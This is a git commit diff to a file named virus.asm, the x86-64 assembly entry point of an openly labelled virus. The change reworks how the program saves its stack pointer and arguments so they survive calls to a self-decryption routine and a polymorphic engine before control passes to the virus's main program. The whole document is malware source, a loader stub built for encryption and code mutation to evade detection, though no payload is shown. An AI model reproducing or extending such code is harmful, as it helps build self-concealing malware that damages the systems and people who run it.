880fd3573b11880b969131d56cfaea41ef4d9104
Deepak Tivari <deepak.tivari@gmail.com>
2019-05-15 00:10:52 +0800

    argv argc state remains intact even after decrypt call

--- virus.asm
+++ virus.asm
@@ -13,28 +13,45 @@ section .text
 align 16
 _start:             ; Global entry point
 
-	; ; save variables to stack for calling main later
 
-	;rbx never changes after decrypt function call, so store rsp there
-	;do this the first action to preserve integrity of rsp as the value of rsp will change every instruction parsed
-	mov rbx, rsp
+	;; this is undone, it gets the name of the virus file, for now ill hardcode the virus name in c program
+    ; mov rax, 1           
+    ; mov rdi, 1         
+    ; mov rsi, [rsp+8]
+    ; mov rdx, 5          
+    ; syscall
 
-	; save current state on stack
-	push rsp
-	push rdi
-	push rsi
+	; ; save current state on stack
+	; push rsp
+	; push rdi
+	; push rsi
+    ; call decrypt
 
-    call decrypt
+	; ; reload the initial program, state
+	; pop rsi
+	; pop rdi
+	; pop rsp
 
-	; reload the initial program, state
-	pop rsi
-	pop rdi
-	pop rsp
+    ; mov rax, 1           
+    ; mov rdi, 1         
+    ; mov rsi, [rsp+8]
+    ; mov rdx, 5          
+    ; syscall
 
-	; save current state on stack
-	push rsp
-	push rdi
-	push rsi
+	; ; save current state on stack
+	; push rsp
+	; push rdi
+	; push rsi
+	mov rbx, rsp 
+	mov r14, rdi
+	mov r15, rsi
+
+	call decrypt
+
+	mov rsp, rbx 
+	mov rdi, r14
+	mov rsi, r15
+
 
 	; call polymorph engine
 	xor rbp, rbp
@@ -45,9 +62,9 @@ _start:             ; Global entry point
 	call polymorphicengine
 	
 	; reload the initial program, state
-	pop rsi
-	pop rdi
-	pop rsp
+	mov rsp, rbx 
+	mov rdi, r14
+	mov rsi, r15
 
 	; call the external virus program
 	xor rbp, rbp
@@ -56,7 +73,6 @@ _start:             ; Global entry point
 	lea rdx, [rsp+rdi+8*8]
 	push rdi
 	call main
-	
 	mov rdi, rax
 	mov eax, 1
 	int 80h
